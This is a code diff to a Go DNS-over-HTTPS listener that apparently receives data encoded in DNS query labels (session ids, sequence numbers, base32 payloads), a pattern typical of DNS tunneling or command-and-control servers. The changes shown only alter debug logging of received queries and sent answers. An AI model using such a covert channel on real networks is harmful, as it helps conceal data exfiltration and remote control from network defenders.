@@ -477,6 +477,8 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			} else if (signalBits & 0x2) != 0 {
 				transport = "DoH"
 			}
+			// Suppress unused variable warnings (idx/seqCounter used for protocol parsing but not logging)
+			_, _ = idx, seqCounter
 
 			dataLabel := strings.Join(base[4:], "")
 			enc := base32.StdEncoding.WithPadding(base32.NoPadding)
@@ -518,14 +520,11 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 			}
 
 			if sid != "" {
-				ts := time.Now().UnixMilli()
-				fmt.Printf("[SRV-RX] t=%d op=%s sid=%s raw_seq=%s raw_idx=%s seq=%d idx=%d sig=0x%x ctr=%d transport=%s data_len=%d src=%s\n",
-					ts, op, sid,
-					base[2], base[3],
-					seq, idx,
-					signalBits, seqCounter,
-					transport,
-					len(dataB), remote)
+				ts := time.Now().Format("15:04:05.000")
+				// Print full QNAME (readable domain format)
+				fmt.Printf("[%s] [RX] QNAME: %s\n", ts, q.Name)
+				fmt.Printf("[%s] [RX] op=%s sid=%s trans=%s src=%s data_len=%d\n",
+					ts, op, sid, transport, remote, len(dataB))
 			}
 		}
 
@@ -895,6 +894,21 @@ func (d *DoHListener) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
 		default:
 			rr := &dns.TXT{Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl}, Txt: []string{"OK"}}
 			m.Answer = append(m.Answer, rr)
+		}
+	}
+
+	// Log TX response
+	if dohDebug && len(m.Answer) > 0 {
+		ts := time.Now().Format("15:04:05.000")
+		for _, ans := range m.Answer {
+			switch rr := ans.(type) {
+			case *dns.TXT:
+				fmt.Printf("[%s] [TX] TXT: %v\n", ts, rr.Txt)
+			case *dns.A:
+				fmt.Printf("[%s] [TX] A: %s\n", ts, rr.A.String())
+			case *dns.AAAA:
+				fmt.Printf("[%s] [TX] AAAA: %s\n", ts, rr.AAAA.String())
+			}
 		}
 	}
 
